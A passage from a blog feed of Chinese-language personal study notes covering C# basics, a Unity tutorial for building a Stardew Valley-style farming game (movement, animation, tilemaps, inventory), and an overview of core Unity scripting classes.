class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while(condition) &#123;&#125;;</span><br><span class="line">do &#123;&#125; while ();</span><br><span class="line"></span><br><span class="line">for (int a = 10; a &lt; 20; a = a + 1) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">int[] fibarray = new int[] &#123; 0, 1, 1, 2, 3, 5, 8, 13 &#125;;</span><br><span class="line">foreach (int element in fibarray) &#123;&#125;;</span><br></pre></td></tr></table></figure></li><li><p>字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string[] strs = &#123; &quot;Hello&quot;, &quot;From&quot;, &quot;Tutorials&quot;, &quot;Point&quot; &#125;;</span><br><span class="line">string str = strs[0];</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>方法</th><th style="text-align:center">举例</th></tr></thead><tbody><tr><td><code>String.Compare(str1, str2)</code></td><td style="text-align:center">比较两个指定的 string 对象，并返回一个表示它们在排列顺序中相对位置的整数</td></tr><tr><td><code>String.Concat(str1, str2, str3)</code></td><td style="text-align:center">连接字符串</td></tr><tr><td><code>bool str.Contains(&quot;t&quot;)</code></td><td style="text-align:center">判断字符串中是否包含字符</td></tr><tr><td><code>bool str.StartsWith(&quot;tt&quot;)</code></td><td style="text-align:center">判断字符串是否以指定字符开头</td></tr><tr><td><code>bool str.EndsWith(&quot;tt&quot;)</code></td><td style="text-align:center">判断字符串是否以指定字符结尾</td></tr><tr><td><code>bool str.Equals(&quot;t&quot;)</code></td><td style="text-align:center">判断字符串是否和指定字符串相同</td></tr><tr><td><code>int str.IndexOf(&quot;t&quot;)</code></td><td style="text-align:center">返回第一次出现的索引</td></tr><tr><td><code>int str.LastIndexOf(&quot;t&quot;)</code></td><td style="text-align:center">返回最后一次出现的索引</td></tr><tr><td><code>string str.Insert(int startIndex, string value)</code></td><td style="text-align:center">指定的字符串被插入在当前 string 对象的指定索引位置</td></tr><tr><td><code>string String.Join(string separator, string[] value)</code></td><td style="text-align:center">连接一个字符串数组中的所有元素，使用指定的分隔符分隔每个元素。</td></tr><tr><td><code>string str.Replace(string oldValue, string newValue)</code></td><td style="text-align:center">替换</td></tr><tr><td><code>string[] str.Split(char[] separator)</code></td><td style="text-align:center">分割为数组</td></tr><tr><td><code>string str.ToLower()</code></td><td style="text-align:center">转换为小写</td></tr><tr><td><code>string str.ToUpper()</code></td><td style="text-align:center">转换为大写</td></tr><tr><td><code>string str.Trim()</code></td><td style="text-align:center">去掉前后空白符</td></tr></tbody></table><h3 id="5-自定义数据类型"><a href="#5-自定义数据类型" class="headerlink" title="5. 自定义数据类型"></a>5. 自定义数据类型</h3><ul><li><p>enum<br>枚举列表中的每个符号代表一个整数值，一个比它前面的符号大的整数值。第一个枚举符号的值是 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enum Day &#123; Sun, Mon, Tue, Wed, Thu, Fri, Sat &#125;;</span><br><span class="line"></span><br><span class="line">int x = (int)Day.Sun // 0</span><br></pre></td></tr></table></figure></li><li><p>struct<br>struct 语句为程序定义了一个带有多个成员的新的数据类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct Books</span><br><span class="line">&#123;</span><br><span class="line">  public string title;</span><br><span class="line">  public string author;</span><br><span class="line">  public string subject;</span><br><span class="line">  public int book_id;</span><br><span class="line">&#125;; </span><br><span class="line">Books Book1;        /* 声明 Book1，类型为 Books */</span><br></pre></td></tr></table></figure></li><li><p>interface<br>接口定义了属性、方法和事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">interface IMyInterface</span><br><span class="line">&#123;</span><br><span class="line">        // 接口成员</span><br><span class="line">    void MethodToImplement();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class InterfaceImplementer : IMyInterface</span><br><span class="line">&#123;</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">        InterfaceImplementer iImp = new InterfaceImplementer();</span><br><span class="line">        iImp.MethodToImplement();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void MethodToImplement()</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;MethodToImplement() called.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Unity 仿星露谷</title>
      <link href="/2024/12/30/unity-%E6%98%9F%E9%9C%B2%E8%B0%B7/"/>
      <url>/2024/12/30/unity-%E6%98%9F%E9%9C%B2%E8%B0%B7/</url>
      <content type="html"><![CDATA[<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><ul><li>素材：<a href="https://itch.io/" target="_blank" rel="noopener">https://itch.io/</a>  <a href="https://shubibubi.itch.io/cozy-farm" target="_blank" rel="noopener">https://shubibubi.itch.io/cozy-farm</a></li><li>课程资料：<a href="https://www.sikiedu.com/course/1789?ff=b_siki" target="_blank" rel="noopener">https://www.sikiedu.com/course/1789?ff=b_siki</a></li><li>教学视频：<a href="https://www.bilibili.com/video/BV1TC4y1B7VZ?spm_id_from=333.788.player.switch&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=9" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1TC4y1B7VZ?spm_id_from=333.788.player.switch&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=9</a></li><li>unity版本: 2023.0</li></ul><h3 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h3><ul><li>Assets<ul><li>Prefabs</li><li>Scenes</li><li>Sprites<ul><li>Palettes</li></ul></li><li>Animations</li></ul></li></ul><p>Scene</p><ul><li>Main Camera: size可以改变视野大小</li><li>Player</li><li>Grid - Tilemap</li></ul><p><br></p><h3 id="1-角色移动"><a href="#1-角色移动" class="headerlink" title="1. 角色移动"></a>1. 角色移动</h3><ol><li>导入资源<br>将 char1.png(资源是已经切好片的) 放入 Sprites 文件夹 - Pixels Per Unit: 16 - Filter Mode: Point - Compression: None</li><li>角色移动<br>添加Player到场景中 - 添加并绑定绑定Player.cs </li><li>添加动画<br>将资源 char1_0 至 char1_7 全选，拖到Player上，会自动创建一个动画动态机, 保存为 Player_Walk_Down.anim 到 Animations 文件夹（上下左右移动的动画都创建上）</li><li><p>动画状态机: </p><ul><li>Animations 文件夹下会自动生成一个 Player.controller，双击进入这个文件</li><li>创建一个空状态: create state - empty 为 EmptyState，右击设置为默认状态 Set as Layer Default State </li><li>创建一个混合动画: 根据参数值确定播放哪个动画<ul><li>create state: Blend Tree 为 Walk , 双击Walk进入编辑状态，BlenType 选 2D Simple Directional </li><li>Parameters: 添加2个float参数为 horizontal 和 vertical, Inspector里的Parameters也设置上</li><li>Motion: 添加4个Motion Field - 将Animation的动画拖进Motion<br>Player_Walk_Down: 0 -1 1<br>Player_Walk_Left: -1 0 1<br>Player_Walk_Right: 1 0 1<br>Player_Walk_Up: 0 1 1</li></ul></li><li>状态切换<ul><li>回到Base Layer，Make Transition 让 EmptyState 和 Walk 两个状态相互可切换。Parameters添加boolean值 isWalking</li><li>点击中间的连线: 添加condition设置isWalking值。设置Settings - Transition Duration(s): 0; Has Exit Time: false</li></ul></li><li>增加代码控制<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">public class Player : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    public float speed = <span class="number">3</span>; </span><br><span class="line">    private Animator anim;</span><br><span class="line">    private <span class="keyword">void</span> Awake()</span><br><span class="line">    &#123;</span><br><span class="line">        anim = GetComponent&lt;Animator&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> Update()</span><br><span class="line">    &#123;</span><br><span class="line">        float x = Input.GetAxisRaw(<span class="string">"Horizontal"</span>);</span><br><span class="line">        float y = Input.GetAxisRaw(<span class="string">"Vertical"</span>);</span><br><span class="line">        Vector2 direction = <span class="keyword">new</span> Vector2(x, y);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动画</span></span><br><span class="line">        <span class="keyword">if</span> (direction.magnitude &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            anim.SetBool(<span class="string">"isWalking"</span>, <span class="literal">true</span>);</span><br><span class="line">            anim.SetFloat(<span class="string">"horizontal"</span>, x);</span><br><span class="line">            anim.SetFloat(<span class="string">"vertical"</span>, y);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            anim.SetBool(<span class="string">"isWalking"</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 位移</span></span><br><span class="line">        transform.Translate(direction * speed * Time.deltaTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>改变静止状态下朝向问题</p><ul><li>打开Animation面板，选中场景中的Player -  create new clip: Player_Idle_Down - 将Char1_0图片拖到0帧处（上下左右朝向的动画都创建上）</li><li>创建混合树<ul><li>create state: Blend Tree 为 Idol , 双击Idol进入编辑状态，BlenType 选 2D Simple Directional </li><li>Parameters 为 horizontal 和 vertical</li><li>Motion: 添加4个Motion Field - 将Animation的动画拖进Motion<br>Player_Idol_Down: 0 -1 1<br>Player_Idol_Left: -1 0 1<br>Player_Idol_Right: 1 0 1<br>Player_Idol_Up: 0 1 1</li></ul></li><li>删除emptyState, 替换为Idol为默认状态，重新设置连线的condition</li></ul></li></ol><p><br></p><h3 id="2-瓦片地图"><a href="#2-瓦片地图" class="headerlink" title="2. 瓦片地图"></a>2. 瓦片地图</h3><ol><li>导入资源<ul><li>将 tiles.png(每个贴图都是16 * 16px的大小) 放入 Assets/Sprites, Pixels Per Unit:16, Filter Mode: Point, Compression: None</li><li>更改切图方式: Open Sprite Editor - Slice: Group By Cell Size 16 * 16 - 点击slice</li></ul></li><li><p>添加地图 + 调色板</p><ul><li>创建瓦片地图：create 2D Object - TileMap - Rectangile（页面会多了很多小格子，每个都是 1m * 1m的大小）</li><li>创建瓦片地图调色板：Window - 2D - Tile Palette，Create New Tile Pattle: Ground 保存在Assets/Sprites/Palettes，将整个tiles.png拖入调色板，保存到 Assets/Sprites/Palettes</li><li>调色板绘制地图工具：铅笔-选中色块绘制到地图上，块复制，填充，选取色块</li><li><p>地图层级分类<br>点击场景中的Player, Sorting Layer - Add Sorting Layer, 把下面的这几层添加上</p><ul><li>Layer1: Env_Background: 背景</li><li>Env_Ground_Bottom：地面底层</li><li>Env_Ground_Top：地面顶层</li><li>Env_Building：放置建筑物</li><li>Interactable: 可以交互的瓦片地图，种植</li><li>Game: 主角，npc</li></ul><p>在Grid下创建4个瓦片地图，分别对应层级Background, Env_Ground_Bottom, Env_Ground_Top,Interactable</p></li></ul></li><li><p>绘制地图</p><ul><li>Env_Background: 绘制纯绿色草地</li><li>Env_Ground_Bottom：绘制悬崖地形</li><li>Env_Ground_Top：地面顶层</li><li>Env_Building：放置建筑物<ul><li>导入buildings.png，放置房子House, 给House Add Component - Physics 2D - Polygon Collider - 点击Edit Collider编辑多边形碰撞器每个点的位置</li><li>增加Player和House的碰撞检测：给Player设置刚体 - Add Component - Righdbody 2D - Gravity Scale: 0 - Constraints - Freeze Rotation-Z: 勾选（碰撞时不会被改变朝向）; 给Player添加Box Collider</li></ul></li><li>Interactable: 可以交互的瓦片地图，种植</li><li>Game: 主角，npc</li></ul></li></ol><p><br></p><h3 id="3-背包物品"><a href="#3-背包物品" class="headerlink" title="3. 背包物品"></a>3. 背包物品</h3><h4 id="3-1-种子拾起"><a href="#3-1-种子拾起" class="headerlink" title="3.1 种子拾起"></a>3.1 种子拾起</h4><ol><li>导入资源：导入 crops_all.png - 编辑Grid By Cell Size 16 * 16 Slice - Pixels Per Unit: 32</li><li>种子预制件：将萝卜种子图片放入场景为Seed_Carrot，将它拖入Assets/Prefabs，会自动变成Prefab。添加Box Collider 2D, Is Trigger: true；添加标签Tag: Pickable<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Player.cs</span><br><span class="line">// 种子拾起</span><br><span class="line">private void OnTriggerEnter2D(Collider2D collision)</span><br><span class="line">&#123;</span><br><span class="line">    if (collision.tag == &quot;Pickable&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(collision.gameObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="3-2-背包保存物品"><a href="#3-2-背包保存物品" class="headerlink" title="3.2 背包保存物品"></a>3.2 背包保存物品</h4><ol><li><p>创建数据的三个类</p><ul><li>InventoryData 仓库信息 <code>List&lt;SlotData&gt;</code></li><li>SlotData 物品信息包含 ItemData, count</li><li>ItemData 物品信息类<ul><li>itemType</li><li>itemSprite</li><li>itemPrefab</li><li>maxCount<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// InventoryData.cs</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class InventoryData : ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public List&lt;SlotData&gt; slotList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// SlotData.cs</span><br><span class="line">using System;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">[Serializable]</span><br><span class="line">public class SlotData</span><br><span class="line">&#123;</span><br><span class="line">    public ItemData item;</span><br><span class="line">    public int count = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// ItemData.csusing System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">public enum ItemType</span><br><span class="line">&#123;</span><br><span class="line">    None,</span><br><span class="line">    Seed_Carrot,</span><br><span class="line">    Seed_Tomato,</span><br><span class="line">    Hoe</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class ItemData: ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public ItemType type= ItemType.None;</span><br><span class="line">    public Sprite sprite;</span><br><span class="line">    public GameObject prefab;</span><br><span class="line">    public int maxCount = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>创建Resources用来保存数据</p><ul><li>创建Assets/Resources/Data文件夹，在Data文件夹里</li><li>create ItemData: Seed_Carrot, Seed_Tomato 设置好参数</li><li>create InventoryData: Backpack 用来管理背包的物品信息</li></ul></li><li><p>物品管理逻辑<br>场景中create empty，挂载Assets/Scripts/Manager/InventoryMananger.cs，用来初始化物品字段、背包数据，处理物品拾取逻辑</p></li><li><p>绘制背包</p></li></ol><ul><li>场景中 create UI Panel, 设置Canvas - UI Scale Mode: Scale With Screen Size - Reference Resolution: 1920 * 1080 </li><li>设置Panel: BackpackUI，移除Image组件，在BackpackUI下添加背包素材 create Image: Bg_Frame, Bg_Right, Bg_Left 调整大小</li><li>添加物品网格栏: create empty - add component - Grid Layout Group: SlotGrid - 在它下面添加24个网格照片的Prefab: SlotUI，调整Cell Size和Spacing。在SlotUI下添加Image和Text(这里需要引入TMP资源)，物品照片和物品数量。添加关闭按钮Button组件</li><li>给BackpackUI添加脚本Assets/UI.cs，控制显示隐藏 &amp; 数据显示<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Unity Script</title>
      <link href="/2024/12/30/unity%E6%96%87%E6%A1%A3/"/>
      <url>/2024/12/30/unity%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-重要的类"><a href="#1-重要的类" class="headerlink" title="1. 重要的类"></a>1. 重要的类</h3><p>GameObject：表示可以存在于场景中的对象的类型。<br>MonoBehaviour：基类，默认情况下，所有 Unity 脚本都派生自该类。<br>Object：Unity 可以在编辑器中引用的所有对象的基类。<br>Transform：提供多种方式来通过脚本处理游戏对象的位置、旋转和缩放，以及与父和子游戏对象的层级关系。<br>Vectors：用于表达和操作 2D、3D 和 4D 点、线和方向的类。<br>Quaternion：表示绝对或相对旋转的类，并提供创建和操作它们的方法。<br>ScriptableObject：可用于保存大量数据的数据容器。<br>Time（以及帧率管理）：Time 类用于测量和控制时间，并管理项目的帧率。<br>Mathf：一组常见的数学函数，包括三角函数、对数函数以及游戏和应用开发中常用的其他函数。<br>Random：提供简便的方法来生成各种常用类型的随机值。<br>Debug：用于可视化编辑器中的信息，这些信息可以帮助您了解或调查项目运行时发生的情况。<br>Gizmos 和 Handles：用于在 Scene 视图和 Game 视图绘制线条和形状以及交互式手柄和控件。</p><h4 id="1-1-MonoBehaviour"><a href="#1-1-MonoBehaviour" class="headerlink" title="1.1 MonoBehaviour"></a>1.1 MonoBehaviour</h4><p>基类，默认情况下，所有 Unity 脚本都派生自该类。为了连接到 Unity 的内部架构，你创建的类需要继承<code>MonoBehaviour</code>用于添加到到游戏对象的上。</p><ul><li>创建一个在Inspector里可编辑的字段：定义一个<code>public</code>变量</li><li><p>隐藏在Inspector里显示，添加<code>[HideInInspectors]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using UnityEngine;</span><br><span class="line">using System.Collections;</span><br><span class="line"></span><br><span class="line">public class MainPlayer : MonoBehaviour </span><br><span class="line">&#123;</span><br><span class="line">  // 创建一个在Inspector里可编辑的字段</span><br><span class="line">  public string myName;</span><br><span class="line">  </span><br><span class="line">  void Start () </span><br><span class="line">  &#123;</span><br><span class="line">      Debug.Log(&quot;I am alive and my name is &quot; + myName);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>生命周期函数<br>(<a href="https://docs.unity.cn/cn/current/Manual/ExecutionOrder.html" target="_blank" rel="noopener">更多事件函数: 动画更新循环，Rendering, 帧之间， Editor操作</a>)</p><ul><li>加载<ul><li>Awake: 在任何 Start 函数之前并在实例化预制件之后调用</li><li>OnEnable: 在启用对象后立即调用</li><li>Start: 仅当启用脚本实例后，才会在第一次帧更新之前调用 Start</li></ul></li><li>更新<ul><li>FixedUpdate: 在每次物理更新之前都会调用一个称为 FixedUpdate 的单独事件函数</li><li>Update: 每帧调用一次 Update</li><li>LateUpdate: 每帧调用一次 LateUpdate</li></ul></li><li>销毁<ul><li>OnDestroy: 对象存在的最后一帧完成所有帧更新之后</li><li>OnApplicationQuit: 在退出应用程序之前在所有游戏对象上调用此函数 </li><li>OnDisable: 行为被禁用或处于非活动状态时</li></ul></li></ul></li></ul><p><br></p><h4 id="1-2-GameObject"><a href="#1-2-GameObject" class="headerlink" title="1.2 GameObject"></a>1.2 GameObject</h4><p>用于表示任何可以存在于场景中的事物<br>属性</p><ul><li><code>gameObject.tag</code></li><li><code>gameObject.transform</code></li><li><code>gameObject.transform.position = new Vector3(1,1,0)</code></li><li><code>gameObject.enabled</code></li><li><code>gameObject.layer</code></li></ul><p>方法</p><ul><li><code>gameObject.GetComponent&lt;Animator&gt;()</code>获取附加在游戏对象上类型为Type的组件</li><li><code>gameObject.GetComponentInChildren&lt;Image&gt;()</code>深度首次搜索返回 GameObject 或其任何子项中类型为 type 的组件</li><li><code>gameObject.AddComponent(SphereCollider)</code>将组件添加到该游戏对象上</li><li><code>gameObject.setActive(bool)</code>激活/停用</li></ul><p>静态方法</p><ul><li><code>GameObject.Find(&quot;MainHeroCharacter&quot;)</code>按name查找GameObject</li><li><code>GameObject.FindWithTag(&quot;Chef&quot;)</code>返回一个tag为 Chef 的活动 GameObject。如果未找到 GameObject，则返回 null。</li><li><code>GameObject.FindGameObjectsWithTag(&quot;Stove&quot;)</code>返回标签为 Stove 的活动 GameObjects 的数组</li></ul><p>静态函数</p><ul><li><code>Instantiate(prefab, position, rotation, parent)</code> 实例化预制件</li><li><code>Destory(gameObject)</code>移除</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 获取外部游戏对象</span><br><span class="line">public GameObject House;</span><br><span class="line"></span><br><span class="line">// 获取 &amp; 销毁</span><br><span class="line">private void OnTriggerEnter2D(Collider2D collision)</span><br><span class="line">&#123;</span><br><span class="line">  Destroy(collision.gameObject);</span><br><span class="line">  Destroy(this)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-Vector"><a href="#1-3-Vector" class="headerlink" title="1.3 Vector"></a>1.3 Vector</h4><p>Vector2、Vector3 和 Vector4 类来处理 2D、3D 和 4D 矢量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var heading = target.position - player.position;</span><br><span class="line">var distance = heading.magnitude; // 向量长度</span><br><span class="line">var direction = heading / distance; // 向量归一化</span><br></pre></td></tr></table></figure></p><h4 id="1-4-ScriptableObject"><a href="#1-4-ScriptableObject" class="headerlink" title="1.4 ScriptableObject"></a>1.4 ScriptableObject</h4><p><code>ScriptableObject</code> 是一个可独立于类实例来保存大量数据的数据容器。<code>ScriptableObject</code> 不能附加到游戏对象上。正确的做法是需要将它们保存为项目中的资源。</p><ol><li><p>新增数据<br>定义数据类型，在Assets - create ItemData, create BackpackData创建数据，并在Inspector面板初始化数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// ItemData.cs</span><br><span class="line">public enum ItemType</span><br><span class="line">&#123;</span><br><span class="line">    None,</span><br><span class="line">    Seed_Carrot,</span><br><span class="line">    Seed_Tomato,</span><br><span class="line">    Hoe</span><br><span class="line">&#125;</span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class ItemData: ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public ItemType type = ItemType.None;</span><br><span class="line">    public Sprite sprite;</span><br><span class="line">    public GameObject prefab;</span><br><span class="line">    public int maxCount = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SlotData.cs</span><br><span class="line">[Serializable]</span><br><span class="line">public class SlotData</span><br><span class="line">&#123;</span><br><span class="line">  public ItemData item;</span><br><span class="line">  public int count = 0;</span><br><span class="line">  public void Add(int num = 1)</span><br><span class="line">  &#123;</span><br><span class="line">    this.count += num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// BackpackData.cs</span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class BackpackData : ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public List&lt;SlotData&gt; slotList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取数据<br>通过 <code>Resources.Load</code> 函数，可访问 Assets 文件夹中处于任意位置的名为“Resources”的文件夹中的所有资源。 可以存在多个“Resources”文件夹，加载对象时，将对每个文件夹进行检查。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 获取数据</span><br><span class="line">public BackpackData backpack;</span><br><span class="line">private void Awake()</span><br><span class="line">&#123;</span><br><span class="line">  ItemData[] itemDataArray = Resources.LoadAll&lt;ItemData&gt;(&quot;Data&quot;);</span><br><span class="line">  backpack = Resources.Load&lt;BackpackData&gt;(&quot;Data/Backpack&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 增删数据</span><br><span class="line">public void AddToBackpack(ItemType type)</span><br><span class="line">&#123;</span><br><span class="line">  foreach(SlotData slotData in backpack.slotList)</span><br><span class="line">  &#123;</span><br><span class="line">    if (slotData.item.type == type)</span><br><span class="line">    &#123;</span><br><span class="line">      slotData.Add(); // 此处可以更新UI</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="1-5-transform"><a href="#1-5-transform" class="headerlink" title="1.5 transform"></a>1.5 transform</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transform.Translate(direction * speed * Time.deltaTime); <span class="comment">// 位移</span></span><br></pre></td></tr></table></figure><h4 id="1-6-Time"><a href="#1-6-Time" class="headerlink" title="1.6 Time"></a>1.6 Time</h4><h4 id="1-7-Canvas"><a href="#1-7-Canvas" class="headerlink" title="1.7 Canvas"></a>1.7 Canvas</h4><p>EventSystem 是专门为UI服务的</p><ul><li><code>EventSystem.current.IsPointerOverGameObject()</code> 判断鼠标是否在物体上<br><br></li></ul><p><br></p><h3 